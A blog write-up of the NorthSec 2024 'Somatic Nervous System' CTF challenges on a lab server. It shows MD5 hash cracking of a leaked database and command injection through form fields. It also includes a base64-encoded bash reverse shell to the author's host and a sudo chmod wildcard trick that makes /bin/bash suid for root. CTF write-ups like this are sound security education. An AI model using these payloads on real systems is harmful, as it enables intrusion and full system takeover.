---
layout: post
title: NorthSec 2024 Writeup - Somatic Nervous System
date: 2024-06-08
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2024/06/NorthSec/SomaticNervousSystem
img: 2024/06/NorthSec/SomaticNervousSystem/Description.png
---

This was a fun series of challenges that started with some web exploitation and finished by privilege escalation through `sudo`.

```
The Somatic Nervous System allows the brain to inquiry about the status of various elements within the body. Think of it like a way to quickly get in touch, just like our huddles at work.

Mr Wellington’s nervous system is not what it used to be, and we suspect the brain to not do its job properly. It is time to take things back into control and make sure that communication happens.

At first, you’ll be able to reach the Somatic portal here: http://somatic.ctf 5.

We’ll need you to find a way to crack access into it since we were not given credentials to it. We’ve obtained the source code though, that logic in the password reset looks very flawed to me. Check it out and try to log in.
```


```php
function reset_password($username) {
  global $db;
  if ($username === 'admin') {
      $new_password = generate_random_password(8);
      $hashed_password = md5($new_password);
      $query = "UPDATE user SET password = '$hashed_password' WHERE username = 'admin'";
      $result = $db->exec($query);
      return "The password of the admin has been reset.";
  } else {
      return 'An email for password reset has been sent.';
  }
}

function generate_random_password($length) {
  $characters = '12345678';
  $password = '';
  for ($i = 0; $i < $length; $i++) {
      $password .= $characters[rand(0, strlen($characters) - 1)];
  }
  return $password;
}
```

This challenge started with a website. It provided the code to the password reset functionality, stating that it was flawed.

I started by taking a look around the site.

![Home Page](/assets/images/2024/06/NorthSec/SomaticNervousSystem/Home.png "Home Page")


## Establish Connection

The first link on the page was 'Establish Connection'.

![Establish Connection](/assets/images/2024/06/NorthSec/SomaticNervousSystem/EstablishConnection.png "Establish Connection")

I entered random data, it displayed the information about a meeting.

![Meeting Information](/assets/images/2024/06/NorthSec/SomaticNervousSystem/MeetingInformation.png "Meeting Information")

It used the Somatic ID I provided to load the information about a meeting. I tried enumerating meetings with Caido Automate.

![Caido Automate](/assets/images/2024/06/NorthSec/SomaticNervousSystem/CaidoAutomate.png "Caido Automate")

I ran it, meeting #140 had a flag in its description.

![Caido Automate Success](/assets/images/2024/06/NorthSec/SomaticNervousSystem/CaidoAutomateSuccess.png "Caido Automate Success")

I submitted the flag, only to find out a teammate had already submitted it, but forgot to note it in our team tracking.

![Bonus Flag](/assets/images/2024/06/NorthSec/SomaticNervousSystem/BonusFlag.png "Bonus Flag")


## Exploration

The flag from the meeting was a bonus flag. I started looking around the other pages. There was a password reset page and a login page.

![Login Page](/assets/images/2024/06/NorthSec/SomaticNervousSystem/LoginPage.png "Login Page")

The challenge description hinted at a flaw in the password reset code. The code was using [rand](https://www.php.net/rand), which is not cryptographically secure. And it generates a short password of 8 characters, using only numbers. This is could be brute force easily. But when I tried some password for admin, there was a warning about locking the user. So I kept brute forcing as a last resort.

I thought I might be able to get the seed used to generate the random numbers, but I did not see how. Some searches gave me ways to predict numbers, but I need to have some of the numbers already generated.

While experimenting with the random numbers generation, I had Feroxbuster running to find hidden pages. When I went back to look at the results, I saw something very interesting.

```bash
$ feroxbuster -u "http://somatic.ctf/" -x php                                      
                                                                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://somatic.ctf/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      313c http://somatic.ctf/database => http://somatic.ctf/database/
200      GET       41l      347w    16572c http://somatic.ctf/database/database
200      GET      176l      308w     5899c http://somatic.ctf/index.php
301      GET        9l       28w      311c http://somatic.ctf/static => http://somatic.ctf/static/
200      GET      176l      308w     5899c http://somatic.ctf/
200      GET      112l      208w     2706c http://somatic.ctf/login.php
200      GET       83l      156w     2127c http://somatic.ctf/resetpassword.php
200      GET      145l      248w     3027c http://somatic.ctf/joinsomatic.php
200      GET     2070l    11441w   928885c http://somatic.ctf/static/images/header.png
[####################] - 83s   119614/119614  0s      found:9       errors:9      
[####################] - 83s   119601/119601  1446/s  http://somatic.ctf/ 
[####################] - 4s    119601/119601  29221/s http://somatic.ctf/static/ => Directory listing
[####################] - 0s    119601/119601  8542929/s http://somatic.ctf/database/ => Directory listing
[####################] - 0s    119601/119601  269980/s http://somatic.ctf/static/images/ => Directory listing                                                                                                                              
```

There was an exposed database. I downloaded it and took a look at what it contained.


```bash
$ file database                                                                                                      
database: SQLite 3.x database, last written using SQLite version 3037002, file counter 25, database pages 4, cookie 0x4, schema 4, UTF-8, version-valid-for 25
```

It was an SQLite database, I opened it and look at the data.

```sql
$ sqlite3 database                                     
SQLite version 3.45.1 2024-01-30 16:01:20           
Enter ".help" for usage hints.

sqlite> .tables
meeting  user
sqlite> Select * From meeting
   ...> ;
1|General Meeting|Brian|
2|Dental System|Brian|
3|Hepatic Microsomal Enzyme System|Dispatch|
4|Embryogenesis System|Brian|
5|Retinal System|Brian|
6|Inner Ear System|Dispatch|
7|Mitosis System|Dispatch|
8|Appendix System|Brian|
9|Endocrine system|Dispatch|
10|Anti-Allergens Immune System|Dispatch|
11|Linguistic Memory System|Dispatch|
12|Photographic Memory System|Dispatch|
13|Hair System|Brian|
14|Mirror System|Brian|
15|Gastric Mucosa System|Dispatch|
16|Genetic System|Brian|
17|Somatic Nervous System Manager|admin|FLAG-0a4b44773de4ea0a50ab4512b2ca09dc
18|||
19|||
20|||
...
138|||
139|||
140|FLAG-68c17aebe5e1e8d009bbec7c4cf22dd0||
```

The `meeting` table had the bonus flag that was already submitted. But it also contained another one for meeting #17, in a field that was not displayed on the website.

I submitted it for 1 point.

```bash
$ askgod submit FLAG-0a4b44773de4ea0a50ab4512b2ca09dc                                     
Congratulations, you score your team 1 points!
Message: Good job ! Keep going. There is more. (1/4)
```

Next I looked at the user table.

```sql
sqlite> Select * From user;
1|admin|688ba961dd8e6ca07ff0f5b815b7a958
2|Brian|d543d0dd6a83351773d2ed2be4236538
3|Dispatch|ea1b8916fc7933872fc79723d2e7d2db
```

It has three password hash. I had tried a password reset on the user admin, so I knew there password would be composed of 8 digits. I used `hashcat` to crack it.

```bash
$ cat hash.txt           
admin:688ba961dd8e6ca07ff0f5b815b7a958
Brian:d543d0dd6a83351773d2ed2be4236538
Dispatch:ea1b8916fc7933872fc79723d2e7d2db



$ hashcat -a3 -m0 --username hash.txt "?d?d?d?d?d?d?d?d"
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6849/13763 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

688ba961dd8e6ca07ff0f5b815b7a958:18435268
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hash.txt
Time.Started.....: Sun May 19 09:55:03 2024 (0 secs)
Time.Estimated...: Sun May 19 09:55:03 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?d?d?d?d?d?d?d?d [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   136.7 MH/s (9.03ms) @ Accel:512 Loops:500 Thr:1 Vec:8
Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new)
Progress.........: 100000000/100000000 (100.00%)
Rejected.........: 0/100000000 (0.00%)
Restore.Point....: 100000/100000 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:500-1000 Iteration:0-500
Candidate.Engine.: Device Generator
Candidates.#1....: 12432164 -> 68874949
Hardware.Mon.#1..: Util: 20%

Started: Sun May 19 09:54:48 2024
Stopped: Sun May 19 09:55:05 2024

$ hashcat -a3 -m0 --username hash.txt "?d?d?d?d?d?d?d?d" --show
admin:688ba961dd8e6ca07ff0f5b815b7a958:18435268
```

After a few seconds (thanks to MD5), I had admin's password. I used it to connect in the application. It gave me a dashboard with a flag in it.

![Dashboard](/assets/images/2024/06/NorthSec/SomaticNervousSystem/Dashboard.png "Dashboard")

I submitted the flag for 2 points.

```bash
$ askgod submit FLAG-385328a259bae64564b0cf2757517b0b                                       
Congratulations, you score your team 2 points!
Message: Very nice, now that you have the admin account, what can you do? (2/4)
```

## Remote Code Execution

I looked around the dashboard to see what I could do now that I was connected. There were a few links in the dashboard, but if I remember well, most of them did nothing.

The 'SSL Certificate' link requested some information to generate a new certificate.

![Generate Certificate](/assets/images/2024/06/NorthSec/SomaticNervousSystem/GenerateCertificate.png "Generate Certificate")

I tried getting code execution by sending commands surrounded by backticks in all the fields.

```bash
`wget -6 "http://[9000:6666:6666:6666:216:3eff:feb1:8d80]/"`
```

![RCE On All Fields](/assets/images/2024/06/NorthSec/SomaticNervousSystem/RCEOnAllFields.png "RCE On All Fields")

I immediately got multiple hits on my web server.

![HTTP Requests](/assets/images/2024/06/NorthSec/SomaticNervousSystem/HttpRequests.png "HTTP Requests")

It looks like all the fields were vulnerable. I crafted a reverse shell in base64 to avoid having special characters.


```bash
root@ctn-shell:~# echo '/bin/bash -i >& /dev/tcp/9000:6666:6666:6666:216:3eff:feb1:8d80/443 0>&1  ' | base64 -w0 ; echo
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzkwMDA6NjY2Njo2NjY2OjY2NjY6MjE2OjNlZmY6ZmViMTo4ZDgwLzQ0MyAwPiYxICAK
```

Then I sent it in one of the form fields.

```bash
`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzkwMDA6NjY2Njo2NjY2OjY2NjY6MjE2OjNlZmY6ZmViMTo4ZDgwLzQ0MyAwPiYxICAK|base64 -d |bash`
```

It gave me a shell, and another flag.

```bash
root@ctn-shell:~/eric# nc -6 -klvnp 443
Listening on :: 443

Connection received on 9000:fddb:42ac:b48c:216:3eff:fe66:2533 54060
bash: cannot set terminal process group (176): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ctn-dlebrun-somatic:/var/www/html$ 

www-data@ctn-dlebrun-somatic:/var/www/html$ ls
ls
admin_dashboard.php
database
flag.txt
getMeetingInfo.php
index.html
index.html.1
index.html.2
index.html.3
index.html.4
index.html.5
index.php
joinsomatic.php
login.php
resetpassword.php
sslcertificate.php
static

www-data@ctn-dlebrun-somatic:/var/www/html$ cat flag.txt
cat flag.txt
FLAG-a080cfc29c3a852a508e1e68b1bc5a24
```

I submitted the flag for another 2 points.

```bash
$ askgod submit FLAG-a080cfc29c3a852a508e1e68b1bc5a24                                     
Congratulations, you score your team 2 points!
Message: You are close, just one flag left. (3/4)
```

## User somaticadmin

I looked around the server, and quickly found the password for another user.

```bash
www-data@ctn-dlebrun-somatic:/var/www/html$ ls -la /home/
total 4
drwxr-xr-x  4 root         root          4 Apr 27 20:32 .
drwxr-xr-x 17 root         root         23 Dec 22 08:01 ..
drwxrwxrwx  4 somaticadmin somaticadmin 10 May 19 14:41 somaticadmin
drwxr-x---  2 ubuntu       ubuntu        5 Dec 22 07:56 ubuntu

www-data@ctn-dlebrun-somatic:/var/www/html$ ls -la /home/somaticadmin/
total 12
drwxrwxrwx 4 somaticadmin somaticadmin   10 May 19 14:41 .
drwxr-xr-x 4 root         root            4 Apr 27 20:32 ..
-rw------- 1 somaticadmin somaticadmin   13 May 19 14:41 .bash_history
-rwxrwxrwx 1 somaticadmin somaticadmin  220 Apr 27 20:32 .bash_logout
-rwxrwxrwx 1 somaticadmin somaticadmin 3771 Apr 27 20:32 .bashrc
drwx------ 2 somaticadmin somaticadmin    3 Apr 27 20:39 .cache
-rwxrwxrwx 1 somaticadmin somaticadmin   16 Apr 27 20:32 .password
-rwxrwxrwx 1 somaticadmin somaticadmin  807 Apr 27 20:32 .profile
drwxr-xr-x 2 www-data     www-data        2 May 19 14:41 .ssh
-rwxrwxrwx 1 somaticadmin somaticadmin  981 Apr 27 20:34 .viminfo

www-data@ctn-dlebrun-somatic:/var/www/html$ cat /home/somaticadmin/.password 
8H@ypKbB2iMvJ*3

www-data@ctn-dlebrun-somatic:/var/www/html$ su somaticadmin
Password: 

somaticadmin@ctn-dlebrun-somatic:/var/www/html$ 
```

## Getting root

With the password to a user, I could reconnect with SSH, it came in handy when I broke the server.

I looked at what I could so with `sudo`.

```bash
somaticadmin@ctn-dlebrun-somatic:~$ sudo -l
Matching Defaults entries for somaticadmin on ctn-dlebrun-somatic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User somaticadmin may run the following commands on ctn-dlebrun-somatic:
    (root) NOPASSWD: /bin/chmod -R g+w /tmp/* /*

somaticadmin@ctn-dlebrun-somatic:~$ groups
somaticadmin
```

Those wildcards were interesting. I could make anything group writable. I made `/root` group writable, but since I was not in the root group it did not give my anything. I tried to find files and folders that my group owned. I did not find anything that would give an escalation path if I modified it.

At some point I went YOLO and made everything on the server group writable. That was not a good idea. I got kicked out of SSH and was unable to reconnect. I know that SSH has some file permission checks, one of them probably did not like my changes. I was still able to get a reverse shell, but it would disconnect after a few seconds. I had to ask the challenge designer, [David Lebrun](https://www.linkedin.com/in/davidlebr1/) to reset the server for me.

Once I was able to get back on the server, I kept looking for ways to abuse that `chmod` with wildcards. I looked at [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#chown-chmod) and found a way to do it using `--reference`.

```bash
$ chmod --help    
Usage: chmod [OPTION]... MODE[,MODE]... FILE...
  or:  chmod [OPTION]... OCTAL-MODE FILE...
  or:  chmod [OPTION]... --reference=RFILE FILE...
Change the mode of each FILE to MODE.
With --reference, change the mode of each FILE to that of RFILE.

  -c, --changes          like verbose but report only when a change is made
  -f, --silent, --quiet  suppress most error messages
  -v, --verbose          output a diagnostic for every file processed
      --no-preserve-root  do not treat '/' specially (the default)
      --preserve-root    fail to operate recursively on '/'
      --reference=RFILE  use RFILE's mode instead of MODE values
  -R, --recursive        change files and directories recursively
      --help     display this help and exit
      --version  output version information and exit

Each MODE is of the form '[ugoa]*([-+=]([rwxXst]*|[ugo]))+|[-+=][0-7]+'.

GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
Full documentation <https://www.gnu.org/software/coreutils/chmod>
or available locally via: info '(coreutils) chmod invocation'
```

This argument meant that the `g+w` part of the command would be ignored. `chmod` would look at the permissions from the reference file instead of what is provided in the command. I tried using the POC linked on Hacktricks, but it did not work.

I tried again without the script. I made sure that the file the script created had the `suid` bit set. They I copied those permissions to `bash`. Finally, I used bash to become root and read the last flag.

```bash
somaticadmin@ctn-dlebrun-somatic:/tmp$ ls -l pwn/.confrc 
-rwsrwxrwx 1 somaticadmin somaticadmin 0 May 19 17:06 pwn/.confrc

somaticadmin@ctn-dlebrun-somatic:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash

somaticadmin@ctn-dlebrun-somatic:/tmp$ sudo /bin/chmod -R g+w /tmp/pwn/* /bin/bash --reference=pwn/.confrc 
/bin/chmod: cannot access 'g+w': No such file or directory

somaticadmin@ctn-dlebrun-somatic:/tmp$ ls -l /bin/bash
-rwsrwxrwx 1 root root 1396520 Jan  6  2022 /bin/bash

somaticadmin@ctn-dlebrun-somatic:/tmp$ /bin/bash -p

bash-5.1# id
uid=1001(somaticadmin) gid=1001(somaticadmin) euid=0(root) groups=1001(somaticadmin)

bash-5.1# ls /root/
flag.txt

bash-5.1# cat /root/flag.txt 
FLAG-571d433047a392bf09474155d99f44e1
```